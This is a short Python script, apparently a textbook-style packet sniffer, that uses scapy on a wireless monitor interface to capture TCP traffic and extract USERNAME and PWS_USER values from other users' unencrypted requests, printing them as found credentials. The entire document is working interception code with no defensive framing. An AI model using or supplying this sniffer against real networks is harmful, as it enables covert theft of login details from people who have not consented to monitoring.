import optparse
from scapy.all import *

def findGuest(pkt):
    raw = pkt.sprintf("%Raw.load%")
    name=re.findall("(?i)USERNAME=(.*)&",raw)
    room=re.findall("(?i)PWS_USER=(.*)'",raw)
    if name:
        print "[+] Found a valuable piece of information : "+ str(name[0]) + " || " + str(room[0])


conf.iface = "mon0"
try:
    print "Starting..."
    sniff(filter="tcp", prn=findGuest, store=0)
except KeyboardInterrupt:
    exit(0)

